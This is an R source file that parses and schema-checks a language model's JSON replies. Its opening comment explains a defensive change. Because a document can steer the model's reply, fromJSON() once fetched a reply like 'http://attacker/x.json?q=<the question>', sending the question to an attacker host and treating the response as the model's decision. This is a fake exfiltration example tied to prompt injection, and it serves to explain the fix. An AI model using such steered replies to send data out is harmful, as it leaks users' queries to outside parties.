# core-transport-json.R: a model reply read as JSON.

#' A schema reply's text, parsed, and whether a caller can use it.
#'
#' `problem` says why a reply was not usable: "not JSON", "not an object", or
#' where the reply breaks the schema (see schema_problem()). NULL when `ok`.
#' `own_scalars` is passed on to schema_problem().
#' @noRd
json_reply <- function(text, schema = NULL, allow_empty = FALSE, own_scalars = FALSE) {
  # parse_json(), never fromJSON(). Given a short string that is not valid
  # JSON, fromJSON() treats it as a LOCATION: text starting http:// or https://
  # is downloaded, and a path that exists is opened. This text is the model's
  # reply, which a document can steer, so a reply of
  # "http://attacker/x.json?q=<the question>" made this machine send that
  # request and then recorded whatever came back as the model's decision, and a
  # reply naming a FIFO hung the run. parse_json() only parses; with
  # simplifyVector = TRUE it simplifies exactly as fromJSON() did. Its warning
  # about an unpaired surrogate is quieted: the string is repaired below.
  parse <- function(txt, simplify = TRUE) {
    tryCatch(suppressWarnings(jsonlite::parse_json(txt, simplifyVector = simplify)),
             error = function(e) NULL)
  }
  fail <- function(problem) list(ok = FALSE, value = NULL, problem = problem)
  text <- as_chr1(text)
  val <- parse(text)
  if (is.null(val)) {
    # Some endpoints wrap JSON in a code fence even under strict mode.
    text <- gsub("^\\s*```(?:json)?\\s*|\\s*```\\s*$", "", text, perl = TRUE)
    val <- parse(text)
  }
  if (is.null(val)) return(fail("not JSON"))
  # A "\udc00" escape (half of a split emoji) decodes to bytes that are not
  # UTF-8, and the first regex a reader ran on the value stopped the whole
  # document. Only walked when the reply has a surrogate escape at all.
  if (grepl("\\\\u[dD][89a-fA-F]", text)) val <- repair_utf8_deep(val)
  # A bare 7, "text", [1,2,3] or true is valid JSON but not an object. Callers
  # index into `value` with `$`, which errors on an atomic vector, so anything
  # that is not a named list is treated as a parse failure and routed to the
  # reader's documented degraded path instead.
  ok <- is.list(val) || is.data.frame(val)
  ok <- ok && if (isTRUE(allow_empty)) empty_or_schema_object(val, schema)
              else length(names(val)) > 0
  if (!ok) return(fail("not an object"))
  # The schema is checked on the reply as parsed, before simplification, where
  # an array is still a list and an object a named one. Simplified, [1, 2] and
  # {"a": 1, "b": 2} can both come out as a plain vector, and an array of
  # objects as a data frame, so the shapes the schema names cannot be told
  # apart afterwards.
  if (is.list(schema)) {
    # The unsimplified parse needs the same surrogate repair as `val`, or the
    # checks below fail on the invalid bytes before they can report a problem.
    raw <- parse(text, simplify = FALSE)
    if (grepl("\\\\u[dD][89a-fA-F]", text)) raw <- repair_utf8_deep(raw)
    problem <- schema_problem(raw, schema,
                              need_required = !isTRUE(allow_empty),
                              own_scalars = isTRUE(own_scalars))
    if (!is.null(problem)) return(fail(problem))
  }
  list(ok = TRUE, value = val, problem = NULL)
}

#' Where a parsed reply breaks a JSON schema, or NULL if it does not.
#'
#' `x` is the reply parsed with `simplifyVector = FALSE`. Checked: `type`
#' (one name or several, so `c("string", "null")` is a nullable string),
#' `enum`, `required`, and `properties` and `items` to any depth. Every other
#' keyword is left to the provider. The answer names the first place that
#' fails, as a JSON path with arrays counted from 0, so a trace or a failed
#' call can say what was wrong rather than only that something was.
#'
#' A reply that broke the schema was accepted as long as it was a named
#' object: `{"decision": "maybe"}` was a screening decision, `{"groups":
#' [1, 2, 3]}` a reconcile reply, and either was cached, so re-running served
#' the same broken reply again. Strict mode rules these out, but a gateway
#' that ignores it, a local backend or an ellmer client sending no schema
#' does not.
#'
#' `need_required = FALSE` waives `required` on the top object only: under
#' `allow_empty` a field left out is the reply saying it has nothing for it,
#' and so is a top-level field sent as null, whatever its type.
#'
#' `own_scalars = TRUE` is for a caller that reads every scalar itself and
#' reports, value by value, one it cannot use. A field whose schema allows only
#' scalars then takes any value, and the objects, arrays and required fields
#' around it are checked as usual. gr_extract() is that caller: it reads
#' "1,204" in an integer field as 1204 and records "120 (60 per arm)" as a
#' value it could not read, and refusing the whole reply for either would
#' throw away every other field the excerpt filled.
#' @noRd
schema_problem <- function(x, schema, path = "$", need_required = TRUE, own_scalars = FALSE) {
  if (!is.list(schema)) return(NULL)
  types <- as.character(unlist(schema[["type", exact = TRUE]], use.names = FALSE))
  if (own_scalars && length(types) && !any(c("array", "object") %in% types)) return(NULL)
  if (length(types) && !any(vapply(types, json_is_type, logical(1), x = x))) {
    return(sprintf("%s: expected %s, got %s", path, paste(types, collapse = " or "),
                   json_type_name(x)))
  }
  if (is.null(x)) return(NULL)
  enum <- schema[["enum", exact = TRUE]]
  if (length(enum) && !json_in_enum(x, enum)) {
    return(sprintf("%s: %s is not one of the allowed values", path, json_type_name(x)))
  }
  if (is.list(x) && !is.null(names(x))) {
    props <- schema[["properties", exact = TRUE]]
    if (need_required) {
      need <- as.character(unlist(schema[["required", exact = TRUE]], use.names = FALSE))
      gone <- setdiff(need, names(x))
      if (length(gone)) {
        return(sprintf("%s: missing required %s", path, paste(gone, collapse = ", ")))
      }
    }
    for (nm in intersect(names(x), names(props))) {
      if (!need_required && is.null(x[[nm]])) next
      p <- schema_problem(x[[nm]], props[[nm]], paste0(path, ".", nm), own_scalars = own_scalars)
      if (!is.null(p)) return(p)
    }
  } else if (is.list(x)) {
    items <- schema[["items", exact = TRUE]]
    if (is.list(items)) {
      for (i in seq_along(x)) {
        p <- schema_problem(x[[i]], items, sprintf("%s[%d]", path, i - 1L),
                            own_scalars = own_scalars)
        if (!is.null(p)) return(p)
      }
    }
  }
  NULL
}

#' Is a value parsed with `simplifyVector = FALSE` of this JSON Schema type?
#'
#' Unparsed, every JSON scalar is a length-one vector, an array an unnamed
#' list and an object a named one (`{}` too: it parses to a named empty list).
#' An integer is any whole number, so 3.0 counts, as JSON Schema says it does.
#' @noRd
json_is_type <- function(type, x) {
  scalar <- !is.list(x) && length(x) == 1L && !is.na(x)
  switch(type,
    null    = is.null(x),
    boolean = scalar && is.logical(x),
    string  = scalar && is.character(x),
    number  = scalar && is.numeric(x) && is.finite(x),
    integer = scalar && is.numeric(x) && is.finite(x) && x == round(x),
    array   = is.list(x) && is.null(names(x)),
    object  = is.list(x) && !is.null(names(x)),
    # A type this check does not know is the provider's to enforce.
    TRUE)
}

#' @noRd
json_type_name <- function(x) {
  if (is.null(x)) return("null")
  if (is.list(x)) return(if (is.null(names(x))) "an array" else "an object")
  if (is.character(x)) return(sprintf("the string \"%s\"", substr(x, 1L, 40L)))
  if (is.logical(x)) return(if (isTRUE(x)) "true" else "false")
  format(x)
}

#' Is a non-null scalar one of a schema's enum values?
#'
#' Compared within one kind, so the string "1" is not the number 1. NA and
#' NULL among the values are how this package writes JSON null there (see
#' fields_schema()); a null reply never reaches this, as the type decides
#' whether a field may be null.
#' @noRd
json_in_enum <- function(x, enum) {
  if (is.list(x) || length(x) != 1L) return(FALSE)
  for (e in as.list(enum)) {
    if (is.null(e) || length(e) != 1L || is.na(e)) next
    same_kind <- (is.character(x) && is.character(e)) ||
      (is.numeric(x) && is.numeric(e)) || (is.logical(x) && is.logical(e))
    if (same_kind && x == e) return(TRUE)
  }
  FALSE
}

#' Under `allow_empty`: is this reply `{}`, or an object using the schema's
#' own field names?
#'
#' `allow_empty` is for the one caller where `{}` is a real answer rather than a
#' broken one: `extract` asks each chunk what it can fill and an excerpt that
#' can fill nothing is a finding. Without it the empty object was routed to the
#' failure path, so a document that simply did not discuss the schema came back
#' with every chunk counted as a failed call and the answer marked partial --
#' reporting "we could not read this" for "it does not say".
#'
#' But it let through every other shape as well. A reply that wrapped its
#' fields (`{"extraction": {...}}`), renamed them, or was an array filled
#' nothing, since the reader reads the schema's names, and was then recorded as
#' that same complete negative, partial = FALSE, with no failed call: the mix-up
#' this exists to prevent, the other way round. Strict schemas rule those out,
#' but a gateway that ignores strict mode, or a backend that sends no schema,
#' does not. So an object must be empty or name at least one of the schema's
#' properties; anything else is a call that failed.
#' @noRd
empty_or_schema_object <- function(val, schema) {
  # `{}` parses to a NAMED empty list, `[]` to an unnamed one.
  if (is.data.frame(val) || !is.list(val) || is.null(names(val))) return(FALSE)
  if (!length(val)) return(TRUE)
  props <- names(if (is.list(schema)) schema[["properties", exact = TRUE]])
  !length(props) || any(names(val) %in% props)
}
